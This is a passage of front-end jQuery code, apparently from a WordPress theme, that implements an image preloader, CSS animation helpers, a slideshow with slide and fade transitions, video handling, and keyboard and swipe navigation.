				pp.to2 = setTimeout(function(){ pp.loading_item.removeClass('av-' + status); },1500);
			},

			attach: function()
			{
				if(typeof attach_to === 'undefined'){ attach_to = 'body';}

				pp.loading_item = $('<div class="avia_playpause_icon"></div>').css({display:"none"}).appendTo(attach_to);
			}
		}

		pp.attach();
		return pp;
	};
	
	

	/************************************************************************
	preload images, as soon as all are loaded trigger a special load ready event
	*************************************************************************/
	$.avia_utilities.preload = function(options_passed)
	{
		new $.AviaPreloader(options_passed);
	}
	
	$.AviaPreloader  =  function(options)
	{
	    this.win 		= $(window);
	    this.defaults	=
		{
			container:			'body',
			maxLoops:			10,
			trigger_single:		true,
			single_callback:	function(){},
			global_callback:	function(){}

		};
		this.options 	= $.extend({}, this.defaults, options);
		this.preload_images = 0;
		
		this.load_images();
	}
	
	$.AviaPreloader.prototype  = 
	{
		load_images: function()
		{	
			var _self = this;
			
			if(typeof _self.options.container === 'string'){ _self.options.container = $(_self.options.container); }

			_self.options.container.each(function()
			{
				var container		= $(this);
	
				container.images	= container.find('img');
				container.allImages	= container.images;
	
				_self.preload_images += container.images.length;
				setTimeout(function(){ _self.checkImage(container); }, 10);
			});	
		},
		
		checkImage: function(container)
		{	
			var _self = this;
			
			container.images.each(function()
			{
				if(this.complete === true)
				{
					container.images = container.images.not(this);
					_self.preload_images -= 1;
				}
			});

			if(container.images.length && _self.options.maxLoops >= 0)
			{
				_self.options.maxLoops-=1;
				setTimeout(function(){ _self.checkImage(container); }, 500);
			}
			else
			{
				_self.preload_images = _self.preload_images - container.images.length;
				_self.trigger_loaded(container);
			}
		},

		trigger_loaded: function(container)
		{
			var _self = this;
			
			if(_self.options.trigger_single !== false)
			{
				_self.win.trigger('avia_images_loaded_single', [container]);
				_self.options.single_callback.call(container);
			}

			if(_self.preload_images === 0)
			{
				_self.win.trigger('avia_images_loaded');
				_self.options.global_callback.call();
			}

		}
	}


	/************************************************************************
	CSS Easing transformation table
	*************************************************************************/
	/*
	Easing transform table from jquery.animate-enhanced plugin
	http://github.com/benbarnett/jQuery-Animate-Enhanced
	*/
	$.avia_utilities.css_easings = {
			linear:			'linear',
			swing:			'ease-in-out',
			bounce:			'cubic-bezier(0.0, 0.35, .5, 1.3)',
			easeInQuad:     'cubic-bezier(0.550, 0.085, 0.680, 0.530)' ,
			easeInCubic:    'cubic-bezier(0.550, 0.055, 0.675, 0.190)' ,
			easeInQuart:    'cubic-bezier(0.895, 0.030, 0.685, 0.220)' ,
			easeInQuint:    'cubic-bezier(0.755, 0.050, 0.855, 0.060)' ,
			easeInSine:     'cubic-bezier(0.470, 0.000, 0.745, 0.715)' ,
			easeInExpo:     'cubic-bezier(0.950, 0.050, 0.795, 0.035)' ,
			easeInCirc:     'cubic-bezier(0.600, 0.040, 0.980, 0.335)' ,
			easeInBack:     'cubic-bezier(0.600, -0.280, 0.735, 0.04)' ,
			easeOutQuad:    'cubic-bezier(0.250, 0.460, 0.450, 0.940)' ,
			easeOutCubic:   'cubic-bezier(0.215, 0.610, 0.355, 1.000)' ,
			easeOutQuart:   'cubic-bezier(0.165, 0.840, 0.440, 1.000)' ,
			easeOutQuint:   'cubic-bezier(0.230, 1.000, 0.320, 1.000)' ,
			easeOutSine:    'cubic-bezier(0.390, 0.575, 0.565, 1.000)' ,
			easeOutExpo:    'cubic-bezier(0.190, 1.000, 0.220, 1.000)' ,
			easeOutCirc:    'cubic-bezier(0.075, 0.820, 0.165, 1.000)' ,
			easeOutBack:    'cubic-bezier(0.175, 0.885, 0.320, 1.275)' ,
			easeInOutQuad:  'cubic-bezier(0.455, 0.030, 0.515, 0.955)' ,
			easeInOutCubic: 'cubic-bezier(0.645, 0.045, 0.355, 1.000)' ,
			easeInOutQuart: 'cubic-bezier(0.770, 0.000, 0.175, 1.000)' ,
			easeInOutQuint: 'cubic-bezier(0.860, 0.000, 0.070, 1.000)' ,
			easeInOutSine:  'cubic-bezier(0.445, 0.050, 0.550, 0.950)' ,
			easeInOutExpo:  'cubic-bezier(1.000, 0.000, 0.000, 1.000)' ,
			easeInOutCirc:  'cubic-bezier(0.785, 0.135, 0.150, 0.860)' ,
			easeInOutBack:  'cubic-bezier(0.680, -0.550, 0.265, 1.55)' ,
			easeInOutBounce:'cubic-bezier(0.580, -0.365, 0.490, 1.365)',
			easeOutBounce:	'cubic-bezier(0.760, 0.085, 0.490, 1.365)' 
		};

	/************************************************************************
	check if a css feature is supported and save it to the supported array
	*************************************************************************/
	$.avia_utilities.supported	= {};
	$.avia_utilities.supports	= (function()
	{
		var div		= document.createElement('div'),
			vendors	= ['Khtml', 'Ms','Moz','Webkit'];  // vendors	= ['Khtml', 'Ms','Moz','Webkit','O']; 

		return function(prop, vendor_overwrite)
		{
			if ( div.style[prop] !== undefined  ) { return ""; }
			if (vendor_overwrite !== undefined) { vendors = vendor_overwrite; }

			prop = prop.replace(/^[a-z]/, function(val)
			{
				return val.toUpperCase();
			});

			var len	= vendors.length;
			while(len--)
			{
				if ( div.style[vendors[len] + prop] !== undefined )
				{
					return "-" + vendors[len].toLowerCase() + "-";
				}
			}

			return false;
		};

	}());

	/************************************************************************
	animation function
	*************************************************************************/
	$.fn.avia_animate = function(prop, speed, easing, callback)
	{
		if(typeof speed === 'function') {callback = speed; speed = false; }
		if(typeof easing === 'function'){callback = easing; easing = false;}
		if(typeof speed === 'string'){easing = speed; speed = false;}

		if(callback === undefined || callback === false){ callback = function(){}; }
		if(easing === undefined || easing === false)	{ easing = 'easeInQuad'; }
		if(speed === undefined || speed === false)		{ speed = 400; }

		if($.avia_utilities.supported.transition === undefined)
		{
			$.avia_utilities.supported.transition = $.avia_utilities.supports('transition');
		}
		
		

		if($.avia_utilities.supported.transition !== false )
		{
			var prefix		= $.avia_utilities.supported.transition + 'transition',
				cssRule		= {},
				cssProp		= {},
				thisStyle	= document.body.style,
				end			= (thisStyle.WebkitTransition !== undefined) ? 'webkitTransitionEnd' : (thisStyle.OTransition !== undefined) ? 'oTransitionEnd' : 'transitionend';

			//translate easing into css easing
			easing = $.avia_utilities.css_easings[easing];

			//create css transformation rule
			cssRule[prefix]	=  'all '+(speed/1000)+'s '+easing;
			//add namespace to the transition end trigger
			end = end + ".avia_animate";
			
			//since jquery 1.10 the items passed need to be {} and not [] so make sure they are converted properly
			for (var rule in prop)
			{
				if (prop.hasOwnProperty(rule)) { cssProp[rule] = prop[rule]; }
			}
			prop = cssProp;
			
			
			
			this.each(function()
			{
				var element	= $(this), css_difference = false, rule, current_css;

				for (rule in prop)
				{
					if (prop.hasOwnProperty(rule))
					{
						current_css = element.css(rule);

						if(prop[rule] != current_css && prop[rule] != current_css.replace(/px|%/g,""))
						{
							css_difference = true;
							break;
						}
					}
				}

				if(css_difference)
				{
					//if no transform property is set set a 3d translate to enable hardware acceleration
					if(!($.avia_utilities.supported.transition+"transform" in prop))
					{
						prop[$.avia_utilities.supported.transition+"transform"] = "translateZ(0)";
					}
					
					var endTriggered = false;
					
					element.on(end,  function(event)
					{
						if(event.target != event.currentTarget) return false;
						
						if(endTriggered == true) return false;
						endTriggered = true;

						cssRule[prefix] = "none";

						element.off(end);
						element.css(cssRule);
						setTimeout(function(){ callback.call(element); });
					});
					
					
					//desktop safari fallback if we are in another tab to trigger the end event
					setTimeout(function(){ 
						if(!endTriggered && !avia_is_mobile && $('html').is('.avia-safari') ) { 
							element.trigger(end); 
							$.avia_utilities.log('Safari Fallback '+end+' trigger'); 
						}
					}, speed + 100);
					
					setTimeout(function(){ element.css(cssRule);},10);
					setTimeout(function(){ element.css(prop);	},20);
				}
				else
				{
					setTimeout(function(){ callback.call(element); });
				}

			});
		}
		else // if css animation is not available use default JS animation
		{
			this.animate(prop, speed, easing, callback);
		}

		return this;
	};

})( jQuery );


/* ======================================================================================================================================================
Avia Slideshow
====================================================================================================================================================== */

(function($)
{
    "use strict";

	$.AviaSlider  =  function(options, slider)
	{
		var self = this;
		
		this.$win	 = $( window );
		
	    this.$slider = $( slider );
	    
		this.isMobile = $.avia_utilities.isMobile;
	    
	    this._prepareSlides(options);
	    
		//default preload images then init slideshow
	    $.avia_utilities.preload({container: this.$slider , single_callback:  function(){ self._init( options ); }});
	}

	$.AviaSlider.defaults  = {

		//interval between autorotation switches
		interval:5,

		//autorotation active or not
		autoplay:false,
		
		//set if the loop will stop at the last/first slide or if the slides will loop infinite
		//set to false for infinite loop, "last" to stop at the last slide or "first" to stop at the first slide
		stopinfiniteloop: false,

		//fade or slide animation
		animation:'slide',

		//transition speed when switching slide
		transitionSpeed:900,

		//easing method for the transition
		easing:'easeInOutQuart',

		//slide wrapper
		wrapElement: '>ul',

		//slide element
		slideElement: '>li',

		//pause if mouse cursor is above item
		hoverpause: false,
		
		//attach images as background
		bg_slider: false,
		
		//delay of miliseconds to wait before showing the next slide
		show_slide_delay: 0,
		
		//if slider animation is set to "fade" the fullfade property sets the crossfade behaviour
		fullfade: false

	};

  	$.AviaSlider.prototype =
    {
    	_init: function( options )
    	{
			// set slider options
			this.options = this._setOptions(options);

			//slidewrap
			this.$sliderUl  = this.$slider.find(this.options.wrapElement);

			// slide elements
			this.$slides = this.$sliderUl.find(this.options.slideElement);

			// goto dots
			this.gotoButtons = this.$slider.find('.avia-slideshow-dots a');
			
			//perma caption
			this.permaCaption =  this.$slider.find('>.av-slideshow-caption');

			// slide count
			this.itemsCount = this.$slides.length;

			// current image index
			this.current = 0;

			//loop count
			this.loopCount = 0;

			// control if the slicebox is animating
			this.isAnimating = false;

			// css browser prefix like -webkit-, -moz-
			this.browserPrefix = $.avia_utilities.supports('transition');
			
			// css3 animation?
			this.cssActive = this.browserPrefix !== false ? true : false;
			
			// css3D animation?
			this.css3DActive = document.documentElement.className.indexOf('avia_transform3d') !== -1 ? true : false;
			
			//store the aviaVideoApi object for the current slide if available
			this.video	= false;
			
			//if we have a bg slider no images were preloaded yet. in that case start preloading and attaching images
			if(this.options.bg_slider == true)
			{
				//create array that holds all image urls to preload
				this.imageUrls = [];
				
				//create a preloader icon to indicate loading
				this.loader = $.avia_utilities.loading(this.$slider);
				
				//preload the images ony by one
				this._bgPreloadImages();
				
			}
			else //if it was a default slider all images are already loaded and we can start showing the slider
			{			
				//kickoff the slider: bind functions, show first slide, if active start the autorotation timer
				this._kickOff();
			}
    	},

    	//set the slider options by first merging the efault options and the passed options, then checking the slider element if any data attributes overwrite the option set
    	_setOptions: function(options)
		{
			var newOptions 	= $.extend( true, {}, $.AviaSlider.defaults, options ),
				htmlData 	= this.$slider.data(),
				i 			= "";

			//overwritte passed option set with any data properties on the html element
			for (i in htmlData)
			{
				if (htmlData.hasOwnProperty(i))
				{
					if(typeof htmlData[i] === "string" || typeof htmlData[i] === "number" || typeof htmlData[i] === "boolean")
					{
						newOptions[i] = htmlData[i];
					}
				}
			}

			return newOptions;
		},
		
		_prepareSlides: function(options)
		{	
			//if its a mobile device find all video slides that need to be altered
			if(this.isMobile)
			{
				var alter = this.$slider.find('.av-mobile-fallback-image');
				alter.each(function()
				{	
					var current  = $(this).removeClass('av-video-slide').data({'avia_video_events': true, 'video-ratio':0}),
						fallback = current.data('mobile-img');
						
					current.find('.av-click-overlay, .mejs-mediaelement, .mejs-container').remove();
					
					if(!fallback)
					{
						var appendTo = current.find('.avia-slide-wrap');
						$('<p class="av-fallback-message"><span>Please set a mobile device fallback image for this video in your wordpress backend</span></p>').appendTo(appendTo);
					}
					
					if(options && options.bg_slider)
					{
						current.data('img-url', fallback);
					}
					else
					{
						var image = $('<img src="'+fallback+'" alt="" title="" />');
						current.find('.avia-slide-wrap').append(image);
					}
					
				});
			}
			
		},
		
		//start preloading the background images
		_bgPreloadImages : function(callback)
    	{
    		this._getImageURLS();
    		
    		this._preloadSingle(0, function()
    		{
    			this._kickOff();
				this._preloadNext(1);
    		});
    	},
		
    	//if we are using a background image slider, fetch the images from a data attribute and preload them one by one
    	_getImageURLS: function()
    	{
    		var _self = this;
    		
    		//collect url strings of the images to preload
			this.$slides.each(function(i)
			{
				_self.imageUrls[i] = [];
				_self.imageUrls[i]['url'] = $(this).data("img-url");
				
				//if no image is passed we can set the slide to loaded
				if(typeof _self.imageUrls[i]['url'] == 'string')
				{
					_self.imageUrls[i]['status'] = false;
				}
				else
				{
					_self.imageUrls[i]['status'] = true;
				}
			});
    	},
    	
    	
    	_preloadSingle: function(key, callback)
		{
			var _self 		= this,
				objImage	= new Image();
			
			if(typeof _self.imageUrls[key]['url'] == 'string')
			{
				$(objImage).bind('load error', function()
				{ 
					_self.imageUrls[key]['status'] = true; 
					_self.$slides.eq(key).css('background-image','url(' + _self.imageUrls[key]['url'] + ')');
					if(typeof callback == 'function') callback.apply( _self, [objImage, key] );
				});
				
				if(_self.imageUrls[key]['url'] != "")
				{
					objImage.src = _self.imageUrls[key]['url'];
				}
				else
				{
					$(objImage).trigger('error');
				}
			}
			else
			{
				if(typeof callback == 'function') callback.apply( _self, [objImage, key] );
			}
		},
		
		_preloadNext: function(key)
		{
			if(typeof this.imageUrls[key] != "undefined")
    		{
				this._preloadSingle(key, function()
	    		{
					this._preloadNext(key + 1);
	    		});
    		}
		},
    	

    	//bind click events of slide controlls to the public functions
    	_bindEvents: function()
    	{
    		var self = this,
    			win  = $( window );

    		this.$slider.on('click','.next-slide', $.proxy( this.next, this) );
    		this.$slider.on('click','.prev-slide', $.proxy( this.previous, this) );
    		this.$slider.on('click','.goto-slide', $.proxy( this.go2, this) );

    		if(this.options.hoverpause)
    		{
    			this.$slider.on('mouseenter', $.proxy( this.pause, this) );
    			this.$slider.on('mouseleave', $.proxy( this.resume, this) );
    		}

			if(this.options.stopinfiniteloop && this.options.autoplay)
			{
				if(this.options.stopinfiniteloop == 'last')
				{
					this.$slider.on('avia_slider_last_slide', $.proxy(this._stopSlideshow, this) );
				}
				else if(this.options.stopinfiniteloop == 'first')
				{
					this.$slider.on('avia_slider_first_slide', $.proxy(this._stopSlideshow, this) );
				}
			}

    		win.on( 'debouncedresize.aviaSlider',  $.proxy( this._setSize, this) );

    		//if its a desktop browser add arrow navigation, otherwise add touch nav
    		if(!this.isMobile)
    		{
    			this.$slider.avia_keyboard_controls();
    		}
    		else
    		{
    			this.$slider.avia_swipe_trigger();
    		}
			
			self._attach_video_events();
    	},

    	//kickoff the slider by binding all functions to slides and buttons, show the first slide and start autoplay
    	_kickOff: function()
    	{
    		var self 			= this,
    			first_slide 	= self.$slides.eq(0),
    			video			= first_slide.data('video-ratio');
    		  		
    		// bind events to to the controll buttons
			self._bindEvents();
    		
    		this.$slider.removeClass('av-default-height-applied');
    		
    		//show the first slide. if its a video set the correct size, otherwise make sure to remove the % padding
    		if(video)
    		{ 
    			self._setSize(true); 
    		}
    		else
    		{
	    		if(this.options.keep_pading != true)
	    		{
    				self.$sliderUl.css('padding',0);
					self.$win.trigger('av-height-change');
				}
    		}
    		
    		self._setCenter();
    		first_slide.css({visibility:'visible', opacity:0}).avia_animate({opacity:1}, function()
    		{
    			var current = $(this).addClass('active-slide');
    			
    			if(self.permaCaption.length)
	    		{
	    			self.permaCaption.addClass('active-slide');
	    		}
    		});
    		
    		
    		
    		// start autoplay if active
			if( self.options.autoplay )
			{
				self._startSlideshow();
			}
    		
    	},

    	//calculate which slide should be displayed next and call the executing transition function
    	_navigate : function( dir, pos ) {
			
			if( this.isAnimating || this.itemsCount < 2 || !this.$slider.is(":visible") )
			{
				return false;
			}
			
			this.isAnimating = true;

			// current item's index
			this.prev = this.current;

			// if position is passed
			if( pos !== undefined )
			{
				this.current = pos;
				dir = this.current > this.prev ? 'next' : 'prev';
			}
			// if not check the boundaries
			else if( dir === 'next' )
			{
				this.current = this.current < this.itemsCount - 1 ? this.current + 1 : 0;
				
				if( this.current === 0 && this.options.autoplay_stopper == 1 && this.options.autoplay )
				{
					this.isAnimating = false;
					this.current = this.prev;
					this._stopSlideshow();
					return false;
				}
			}
			else if( dir === 'prev' )
			{
				this.current = this.current > 0 ? this.current - 1 : this.itemsCount - 1;
			}

			//set goto button
			this.gotoButtons.removeClass('active').eq(this.current).addClass('active');

			//set slideshow size
			this._setSize();
			
			//if we are using a background slider make sure that the image is loaded. if not preload it, then show the slide
			if(this.options.bg_slider == true)
			{
				if(this.imageUrls[this.current]['status'] == true )
				{
					this['_' + this.options.animation].call(this, dir);
				}
				else
				{
					this.loader.show();
					this._preloadSingle(this.current, function()
    				{
    					this['_' + this.options.animation].call(this, dir);
    					this.loader.hide();
    				});
				}
			}
			else //no background loader -> images are already loaded
			{
				//call the executing function. for example _slide, or _fade. since the function call is absed on a var we can easily extend the slider with new animations
				this['_' + this.options.animation].call(this, dir);
			}

			if(this.current == 0)
			{
				this.loopCount++;
				this.$slider.trigger('avia_slider_first_slide');
			}
			else if(this.current == this.itemsCount - 1)
			{
				this.$slider.trigger('avia_slider_last_slide');
			}
			else
			{
				this.$slider.trigger('avia_slider_navigate_slide');
			}
		},

		//if the next slide has a different height than the current change the slideshow height
		_setSize: function(instant)
		{
			//if images are attached as bg images the slider has a fixed height
			if(this.options.bg_slider == true) return;
			
			var self    		= this,
				slide 			= this.$slides.eq(this.current),
				img 			= slide.find('img'),
				current			= Math.floor(this.$sliderUl.height()),
				ratio			= slide.data('video-ratio'),
				setTo   		= ratio ? this.$sliderUl.width() / ratio : Math.floor(slide.height()),
				video_height 	= slide.data('video-height'), //forced video height %. needs to be set only once
				video_toppos 	= slide.data('video-toppos'); //forced video top position
				
				this.$sliderUl.height(current).css('padding',0); //make sure to set the slideheight to an actual value
				
				if(setTo != current)
				{
					if(instant == true)
					{
						this.$sliderUl.css({height:setTo});
						this.$win.trigger('av-height-change');
					}
					else
					{
						this.$sliderUl.avia_animate({height:setTo}, function()
						{
							self.$win.trigger('av-height-change');
						});
					}
				}
				
				this._setCenter();
				
				if(video_height && video_height!= "set")
				{
					slide.find('iframe, embed, video, object, .av_youtube_frame').css({height: video_height + '%', top: video_toppos + '%'});
					slide.data('video-height','set');
				}
		},
		
		_setCenter: function()
		{
			//if the image has a min width and is larger than the slider center it
			//positon img based on caption. right caption->left pos, left caption -> right pos
			var slide 		= this.$slides.eq(this.current),
				img 		= slide.find('img'),
				min_width 	= parseInt(img.css('min-width'),10),
				slide_width	= slide.width(),
				caption		= slide.find('.av-slideshow-caption'),
				css_left 	= ((slide_width - min_width) / 2);
			
			if(caption.length)
			{
				if(caption.is('.caption_left'))
				{
					css_left = ((slide_width - min_width) / 1.5);
				}
				else if(caption.is('.caption_right'))
				{
					css_left = ((slide_width - min_width) / 2.5);
				}
			}
			
			if(slide_width >= min_width)
			{
				css_left = 0;
			}
			
			img.css({left:css_left});
		},
		
		_slide: function(dir)
		{
			var dynamic			= false, //todo: pass by option if a slider is dynamic
				modifier		= dynamic == true ? 2 : 1,
				sliderWidth		= this.$slider.width(),
				direction		= dir === 'next' ? -1 : 1,
				property  		= this.browserPrefix + 'transform',
				reset			= {}, transition = {},  transition2 = {},
				trans_val 		= ( sliderWidth * direction * -1),
				trans_val2 		= ( sliderWidth * direction) / modifier;
			
			//do a css3 animation
			if(this.cssActive)
			{
				property  = this.browserPrefix + 'transform';

				//do a translate 3d transformation if available, since it uses hardware acceleration
				if(this.css3DActive)
				{
					reset[property]  = "translate3d(" + trans_val + "px, 0, 0)";
					transition[property]  = "translate3d(" + trans_val2 + "px, 0, 0)";
					transition2[property] = "translate3d(0,0,0)";
				}
				else //do a 2d transform. still faster than a position "left" change
				{
					reset[property]  = "translate(" + trans_val + "px,0)";
					transition[property]  = "translate(" + trans_val2 + "px,0)";
					transition2[property] = "translate(0,0)";					}
			}
			else
			{
				reset.left = trans_val;
				transition.left = trans_val2;
				transition2.left = 0;
			}
			
			if(dynamic)
			{
				transition['z-index']  = "1";
				transition2['z-index']  = "2";
			}
			
			this._slide_animate(reset, transition, transition2);
		},
		
		_slide_up: function(dir)
		{
			var dynamic			= true, //todo: pass by option if a slider is dynamic
				modifier		= dynamic == true ? 2 : 1,
				sliderHeight	= this.$slider.height(),
				direction		= dir === 'next' ? -1 : 1,
				property  		= this.browserPrefix + 'transform',
				reset			= {}, transition = {},  transition2 = {},
				trans_val 		= ( sliderHeight * direction * -1),
				trans_val2 		= ( sliderHeight * direction) / modifier;
			
			//do a css3 animation
			if(this.cssActive)
			{
				property  = this.browserPrefix + 'transform';

				//do a translate 3d transformation if available, since it uses hardware acceleration
				if(this.css3DActive)
				{
					reset[property]  = "translate3d( 0," + trans_val + "px, 0)";
					transition[property]  = "translate3d( 0," + trans_val2 + "px, 0)";
					transition2[property] = "translate3d(0,0,0)";
				}
				else //do a 2d transform. still faster than a position "left" change
				{
					reset[property]  = "translate( 0," + trans_val + "px)";
					transition[property]  = "translate( 0," + trans_val2 + "px)";
					transition2[property] = "translate(0,0)";					}
			}
			else
			{
				reset.top = trans_val;
				transition.top = trans_val2;
				transition2.top = 0;
			}
			
			if(dynamic)
			{
				transition['z-index']  = "1";
				transition2['z-index']  = "2";
			}
			this._slide_animate(reset, transition, transition2);
		},
		
		
		//slide animation: do a slide transition by css3 transform if possible. if not simply do a position left transition
		_slide_animate: function( reset , transition , transition2 )
		{
			
			var self			= this,
				displaySlide 	= this.$slides.eq(this.current),
				hideSlide		= this.$slides.eq(this.prev);
				
				hideSlide.trigger('pause');	
				if( !displaySlide.data('disableAutoplay') ) displaySlide.trigger('play');

				displaySlide.css({visibility:'visible', zIndex:4, opacity:1, left:0, top:0});
				displaySlide.css(reset);
				
				hideSlide.avia_animate(transition, this.options.transitionSpeed, this.options.easing);
				
				var after_slide = function()
				{
					self.isAnimating = false;
					displaySlide.addClass('active-slide');
					hideSlide.css({visibility:'hidden'}).removeClass('active-slide');
					self.$slider.trigger('avia-transition-done');
				}
				
				if(self.options.show_slide_delay > 0)
				{
					setTimeout(function() { displaySlide.avia_animate(transition2, self.options.transitionSpeed, self.options.easing, after_slide); },self.options.show_slide_delay);
				}
				else
				{
					displaySlide.avia_animate(transition2, self.options.transitionSpeed, self.options.easing, after_slide);
				}

		},
		
		//simple fade transition of the slideshow
		_fade: function()
		{
			var self			= this,
				displaySlide 	= this.$slides.eq(this.current),
				hideSlide		= this.$slides.eq(this.prev),
				properties		= {visibility:'visible', zIndex:3, opacity:0},
				fadeCallback 	= function()
				{
					self.isAnimating = false;
					displaySlide.addClass('active-slide');
					hideSlide.css({visibility:'hidden', zIndex:2}).removeClass('active-slide');
					self.$slider.trigger('avia-transition-done');
					
				};
			
			hideSlide.trigger('pause');	
			if( !displaySlide.data('disableAutoplay') ) displaySlide.trigger('play');
			
			if(self.options.fullfade == true)
			{
				hideSlide.avia_animate({opacity:0}, 200, 'linear', function()
				{	
					displaySlide.css(properties).avia_animate({opacity:1}, self.options.transitionSpeed, 'linear',fadeCallback);				
				});
			}
			else
			{
				displaySlide.css(properties).avia_animate({opacity:1}, self.options.transitionSpeed/2, 'linear', function()
				{
					hideSlide.avia_animate({opacity:0}, 200, 'linear', fadeCallback);
				});
			}
			
		},
		
		
		/************************************************************************
		Video functions
		*************************************************************************/
		
		//bind events to the video that tell the slider to autorotate once a video has been played
		_attach_video_events: function()
		{
			var self = this, $html = $('html');
						
			self.$slides.each(function(i)
			{
				var currentSlide 	= $(this),
					caption			= currentSlide.find('.caption_fullwidth, .av-click-overlay'),
					mejs			= currentSlide.find('.mejs-mediaelement');
								
				if(currentSlide.data('avia_video_events') != true)
				{
					currentSlide.data('avia_video_events', true);
					
					currentSlide.on('av-video-events-bound', { slide: currentSlide, wrap: mejs , iteration: i , self: self }, onReady);
					
					currentSlide.on('av-video-ended', { slide: currentSlide , self: self}, onFinish);
					
					currentSlide.on('av-video-play-executed', function(){ setTimeout(function(){  self.pause() }, 100); });
						
					caption.on('click', { slide: currentSlide }, toggle);
					
					// also if the player was loaded before the _bindEvents function was bound trigger it manually
					if(currentSlide.is('.av-video-events-bound')) currentSlide.trigger('av-video-events-bound');
				}
			});
			
			
			//helper functions
			function onReady( event ) 
			{ 	
				//autostart for first slide
				if(event.data.iteration === 0) 
				{	
					event.data.wrap.css('opacity',0);
					if(!event.data.self.isMobile && !event.data.slide.data('disableAutoplay')) { event.data.slide.trigger('play'); } 
					setTimeout(function(){ event.data.wrap.avia_animate({opacity:1}, 400); }, 50);
				}
				else if ($html.is('.avia-msie') && !event.data.slide.is('.av-video-service-html5'))
				{	
					/*
					* Internet Explorer fires the ready event for external videos once they become visible 
					* as oposed to other browsers which always fire immediately. 
					*/
					if( !event.data.slide.data('disableAutoplay') ) event.data.slide.trigger('play');
				}
				
			}
			
			
			
			
			function onFinish( event )
			{ 	
				//if the video is not looped resume the slideshow
				if(!event.data.slide.is('.av-single-slide') && !event.data.slide.is('.av-loop-video'))
				{
					event.data.slide.trigger('reset');
					self._navigate( 'next' );  
					self.resume(); 
				}
				
				//safari 8 workaround for self hosted videos which wont loop by default
				if(event.data.slide.is('.av-loop-video') && event.data.slide.is('.av-video-service-html5'))
				{
					if($html.is('.avia-safari-8'))
					{
						setTimeout(function(){ event.data.slide.trigger('play'); },1);
					}
				}
			}
			
			function toggle( event )
			{
				if(event.target.tagName != "A") 
				{
					event.data.slide.trigger('toggle');
				}
			}
			
		},
		
		
		
		/************************************************************************
		Slideshow control functions
		*************************************************************************/
		
		_timer: function(callback, delay, first)
		{	
		    var self = this, start, remaining = delay;
			
			self.timerId = 0;
			
		    this.pause = function() {
		        window.clearTimeout(self.timerId);
		        remaining -= new Date() - start;
		    };

		    this.resume = function() {
		        start = new Date();
		        self.timerId = window.setTimeout(callback, remaining);
		    };

		    this.destroy = function()
		    {
		    	window.clearTimeout(self.timerId);
		    };

		    this.resume(true);
		},

		//start autorotation
		_startSlideshow: function()
		{
			var self = this;
			
			this.isPlaying = true;
			
			this.slideshow = new this._timer( function()
			{
				/*
				var videoApi = self.$slides.eq(self.current).data('aviaVideoApi')
				if(!videoApi){}
				*/
				
				self._navigate( 'next' );
		
				if ( self.options.autoplay )
				{
					self._startSlideshow();
				}

			}, (this.options.interval * 1000));
		},

		//stop autorotation
		_stopSlideshow: function()
		{
			if ( this.options.autoplay ) {

				this.slideshow.destroy();
				this.isPlaying = false;
				this.options.autoplay = false;
			}
		},

		// public method: shows next image
		next : function(e)
		{	
			e.preventDefault();
			this._stopSlideshow();
			this._navigate( 'next' );
		},

		// public method: shows previous image
		previous : function(e)
		{
			e.preventDefault();
			this._stopSlideshow();
			this._navigate( 'prev' );
		},

		// public method: goes to a specific image
		go2 : function( pos )
		{
			//if we didnt pass a number directly lets asume someone clicked on a link that triggered the goto transition
			if(isNaN(pos))
			{
				//in that case prevent the default link behavior and set the slide number to the links hash
				pos.preventDefault();
				pos = pos.currentTarget.hash.replace('#','');
			}

			pos -= 1;

			if( pos === this.current || pos >= this.itemsCount || pos < 0 )
			{
				return false;
			}

			this._stopSlideshow();
			this._navigate( false, pos );

		},

		// public method: starts the slideshow
		// any call to next(), previous() or goto() will stop the slideshow autoplay
		play : function()
		{
			if( !this.isPlaying )
			{
				this.isPlaying = true;

				this._navigate( 'next' );
				this.options.autoplay = true;
				this._startSlideshow();
			}

		},

		// public methos: pauses the slideshow
		pause : function()
		{
			if( this.isPlaying )
			{
				this.slideshow.pause();
			}
		},

		// publiccmethos: resumes the slideshow
		resume : function()
		{
			if( this.isPlaying )
			{
				this.slideshow.resume();
			}
		},

		// public methos: destroys the instance
		destroy : function( callback )
		{
			this.slideshow.destroy( callback );
		}

    }

    //simple wrapper to call the slideshow. makes sure that the slide data is not applied twice
    $.fn.aviaSlider = function( options )
    {
    	return this.each(function()
    	{
    		var self = $.data( this, 'aviaSlider' );

    		if(!self)
    		{
    			self = $.data( this, 'aviaSlider', new $.AviaSlider( options, this ) );
    		}
    	});
    }



})( jQuery );




// -------------------------------------------------------------------------------------------
// keyboard controls
// -------------------------------------------------------------------------------------------

(function($)
{
	"use strict";

	/************************************************************************
	keyboard arrow nav
	*************************************************************************/
	$.fn.avia_keyboard_controls = function(options_passed)
	{
		var defaults	=
		{
			37: '.prev-slide',	// prev
			39: '.next-slide'	// next
		},

		methods		= {

			mousebind: function(slider)
			{
				slider.hover(
					function(){  slider.mouseover	= true;  },
					function(){  slider.mouseover	= false; }
				);
			},

			keybind: function(slider)
			{
				$(document).keydown(function(e)
				{
					if(slider.mouseover && typeof slider.options[e.keyCode] !== 'undefined')
					{
						var item;

						if(typeof slider.options[e.keyCode] === 'string')
						{
							item = slider.find(slider.options[e.keyCode]);
						}
						else
						{
							item = slider.options[e.keyCode];
						}

						if(item.length)
						{
							item.trigger('click', ['keypress']);
							return false;
						}
					}
				});
			}
		};


		return this.each(function()
		{
			var slider			= $(this);
			slider.options		= $.extend({}, defaults, options_passed);
			slider.mouseover	= false;

			methods.mousebind(slider);
			methods.keybind(slider);

		});
	};


	/************************************************************************
	swipe nav
	*************************************************************************/
	$.fn.avia_swipe_trigger = function(passed_options)
	{
		var win		= $(window),
		isMobile	= $.avia_utilities.isMobile,
		defaults	=
		{
			prev: '.prev-slide',
			next: '.next-slide',
			event: {
				prev: 'click',
				next: 'click'
			}
		},

		methods = {

			activate_touch_control: function(slider)
			{
				var i, differenceX, differenceY;

				slider.touchPos = {};
				slider.hasMoved = false;

				slider.on('touchstart', function(event)
				{
					slider.touchPos.X = event.originalEvent.touches[0].clientX;
					slider.touchPos.Y = event.originalEvent.touches[0].clientY;
				});

				slider.on('touchend', function(event)
				{
					slider.touchPos = {};
	                if(slider.hasMoved) { event.preventDefault(); }
	                slider.hasMoved = false;
				});

				slider.on('touchmove', function(event)
				{
					if(!slider.touchPos.X)
					{
						slider.touchPos.X = event.originalEvent.touches[0].clientX;
						slider.touchPos.Y = event.originalEvent.touches[0].clientY;
					}
					else
					{
						differenceX = event.originalEvent.touches[0].clientX - slider.touchPos.X;
